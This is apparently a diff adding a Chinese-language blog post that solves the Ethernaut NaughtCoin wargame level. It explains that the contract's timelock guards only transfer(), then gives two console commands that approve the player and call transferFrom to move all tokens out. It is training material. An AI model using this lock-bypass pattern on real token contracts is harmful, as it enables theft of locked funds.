+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">24</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="dl">"</span><span class="s2">./BasicToken.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="dl">"</span><span class="s2">./ERC20.sol</span><span class="dl">"</span><span class="p">;</span>
+
+
+<span class="cm">/**
+ * @title Standard ERC20 token
+ *
+ * @dev Implementation of the basic standard token.
+ * https://github.com/ethereum/EIPs/issues/20
+ * Based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol
+ */</span>
+<span class="nx">contract</span> <span class="nx">StandardToken</span> <span class="nx">is</span> <span class="nx">ERC20</span><span class="p">,</span> <span class="nx">BasicToken</span> <span class="p">{</span>
+
+  <span class="nx">mapping</span> <span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">mapping</span> <span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint256</span><span class="p">))</span> <span class="nx">internal</span> <span class="nx">allowed</span><span class="p">;</span>
+
+
+  <span class="cm">/**
+   * @dev Transfer tokens from one address to another
+   * @param _from address The address which you want to send tokens from
+   * @param _to address The address which you want to transfer to
+   * @param _value uint256 the amount of tokens to be transferred
+   */</span>
+  <span class="kd">function</span> <span class="nx">transferFrom</span><span class="p">(</span>
+    <span class="nx">address</span> <span class="nx">_from</span><span class="p">,</span>
+    <span class="nx">address</span> <span class="nx">_to</span><span class="p">,</span>
+    <span class="nx">uint256</span> <span class="nx">_value</span>
+  <span class="p">)</span>
+    <span class="kr">public</span>
+    <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="nx">require</span><span class="p">(</span><span class="nx">_value</span> <span class="o">&lt;=</span> <span class="nx">balances</span><span class="p">[</span><span class="nx">_from</span><span class="p">]);</span>
+    <span class="nx">require</span><span class="p">(</span><span class="nx">_value</span> <span class="o">&lt;=</span> <span class="nx">allowed</span><span class="p">[</span><span class="nx">_from</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]);</span>
+    <span class="nx">require</span><span class="p">(</span><span class="nx">_to</span> <span class="o">!=</span> <span class="nx">address</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+
+    <span class="nx">balances</span><span class="p">[</span><span class="nx">_from</span><span class="p">]</span> <span class="o">=</span> <span class="nx">balances</span><span class="p">[</span><span class="nx">_from</span><span class="p">].</span><span class="nx">sub</span><span class="p">(</span><span class="nx">_value</span><span class="p">);</span>
+    <span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span> <span class="o">=</span> <span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">].</span><span class="nx">add</span><span class="p">(</span><span class="nx">_value</span><span class="p">);</span>
+    <span class="nx">allowed</span><span class="p">[</span><span class="nx">_from</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="nx">allowed</span><span class="p">[</span><span class="nx">_from</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">].</span><span class="nx">sub</span><span class="p">(</span><span class="nx">_value</span><span class="p">);</span>
+    <span class="nx">emit</span> <span class="nx">Transfer</span><span class="p">(</span><span class="nx">_from</span><span class="p">,</span> <span class="nx">_to</span><span class="p">,</span> <span class="nx">_value</span><span class="p">);</span>
+    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="cm">/**
+   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
+   * Beware that changing an allowance with this method brings the risk that someone may use both the old
+   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
+   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
+   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
+   * @param _spender The address which will spend the funds.
+   * @param _value The amount of tokens to be spent.
+   */</span>
+  <span class="kd">function</span> <span class="nx">approve</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_spender</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">_value</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">allowed</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">][</span><span class="nx">_spender</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_value</span><span class="p">;</span>
+    <span class="nx">emit</span> <span class="nx">Approval</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">_spender</span><span class="p">,</span> <span class="nx">_value</span><span class="p">);</span>
+    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="cm">/**
+   * @dev Function to check the amount of tokens that an owner allowed to a spender.
+   * @param _owner address The address which owns the funds.
+   * @param _spender address The address which will spend the funds.
+   * @return A uint256 specifying the amount of tokens still available for the spender.
+   */</span>
+  <span class="kd">function</span> <span class="nx">allowance</span><span class="p">(</span>
+    <span class="nx">address</span> <span class="nx">_owner</span><span class="p">,</span>
+    <span class="nx">address</span> <span class="nx">_spender</span>
+   <span class="p">)</span>
+    <span class="kr">public</span>
+    <span class="nx">view</span>
+    <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint256</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">allowed</span><span class="p">[</span><span class="nx">_owner</span><span class="p">][</span><span class="nx">_spender</span><span class="p">];</span>
+  <span class="p">}</span>
+
+  <span class="cm">/**
+   * @dev Increase the amount of tokens that an owner allowed to a spender.
+   * approve should be called when allowed[_spender] == 0. To increment
+   * allowed value is better to use this function to avoid 2 calls (and wait until
+   * the first transaction is mined)
+   * From MonolithDAO Token.sol
+   * @param _spender The address which will spend the funds.
+   * @param _addedValue The amount of tokens to increase the allowance by.
+   */</span>
+  
+<span class="p">}</span>
+</code></pre></div></div>
+<p>  这里我们可以看到transcationFrom()方法并没有被重写，因此我们可以直接调用，但是需要授权。</p>
+
+<p>  接下来看一下题目代码：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="dl">'</span><span class="s1">zeppelin-solidity/contracts/token/ERC20/StandardToken.sol</span><span class="dl">'</span><span class="p">;</span>
+
+ <span class="nx">contract</span> <span class="nx">NaughtCoin</span> <span class="nx">is</span> <span class="nx">StandardToken</span> <span class="p">{</span>
+
+  <span class="nx">string</span> <span class="kr">public</span> <span class="nx">constant</span> <span class="nx">name</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">NaughtCoin</span><span class="dl">'</span><span class="p">;</span>
+  <span class="nx">string</span> <span class="kr">public</span> <span class="nx">constant</span> <span class="nx">symbol</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">0x0</span><span class="dl">'</span><span class="p">;</span>
+  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">constant</span> <span class="nx">decimals</span> <span class="o">=</span> <span class="mi">18</span><span class="p">;</span>
+  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">timeLock</span> <span class="o">=</span> <span class="nx">now</span> <span class="o">+</span> <span class="mi">10</span> <span class="nx">years</span><span class="p">;</span>
+  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">INITIAL_SUPPLY</span> <span class="o">=</span> <span class="mi">1000000</span> <span class="o">*</span> <span class="p">(</span><span class="mi">10</span> <span class="o">**</span> <span class="nx">decimals</span><span class="p">);</span>
+  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">player</span><span class="p">;</span>
+
+  <span class="kd">function</span> <span class="nx">NaughtCoin</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_player</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+    <span class="nx">player</span> <span class="o">=</span> <span class="nx">_player</span><span class="p">;</span>
+    <span class="nx">totalSupply_</span> <span class="o">=</span> <span class="nx">INITIAL_SUPPLY</span><span class="p">;</span>
+    <span class="nx">balances</span><span class="p">[</span><span class="nx">player</span><span class="p">]</span> <span class="o">=</span> <span class="nx">INITIAL_SUPPLY</span><span class="p">;</span>
+    <span class="nx">Transfer</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="nx">player</span><span class="p">,</span> <span class="nx">INITIAL_SUPPLY</span><span class="p">);</span>
+  <span class="p">}</span>
+  
+  <span class="kd">function</span> <span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">_value</span><span class="p">)</span> <span class="nx">lockTokens</span> <span class="kr">public</span> <span class="nx">returns</span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">super</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">_to</span><span class="p">,</span> <span class="nx">_value</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="c1">// Prevent the initial owner from transferring tokens until the timelock has passed</span>
+  <span class="nx">modifier</span> <span class="nx">lockTokens</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">player</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">require</span><span class="p">(</span><span class="nx">now</span> <span class="o">&gt;</span> <span class="nx">timeLock</span><span class="p">);</span>
+      <span class="nx">_</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+     <span class="nx">_</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span> 
+<span class="p">}</span> 
+</code></pre></div></div>
+<p>  这里我们可以看到合约只重写了transfer()函数，这里的balances并不是Ether，而是一种token，因此我们只需要给自己授权，然后吧token转给一个账户就行了。</p>
+
+<blockquote>
+  <p>await contract.approve(player,1000000<em>(10</em>18))
+await contract.transferFrom(player,instance,1000000*(10**18));</p>
+</blockquote>
+
+<p>  这样以来我们就吧token全部转出了。</p>
+
+<hr />
+
+
+
+<div id="vcomments"></div>
+<script>
+  new Valine({
+    el: '#vcomments',
+    appId: '9PQd0VOdLBtIrk7DuYhbXgo1-gzGzoHsz',
+    appKey: '0tooNX9XI400l94QiuBP0lXm',
+
+    avatar:'robohash',
+    visitor: true, // 阅读量统计
+    enableQQ: true
+  })
+</script>
+
+<!-- id 将作为查询条件 -->
+<span id=/blog/Ethernaut-writeUp class="leancloud_visitors" data-flag-title="Your Article Title">
+  <em class="post-meta-item-text">阅读量 </em>
+  <i class="leancloud-visitors-count"></i>
+</span>
+
+</div>
+  </main>
+
+  <footer class="mt-auto py-3 text-center">
+
+  <small class="text-muted mb-2">
+    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+    by <strong>dyf</strong>
+  </small>
+
+  <div class="container-fluid justify-content-center">
+
+</div><small id="attribution">
+    theme <a href="https://github.com/YoussefRaafatNasry/portfolYOU">portfolYOU</a>
+  </small>
+  
+</footer>
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+
+</body>
+
+</html>
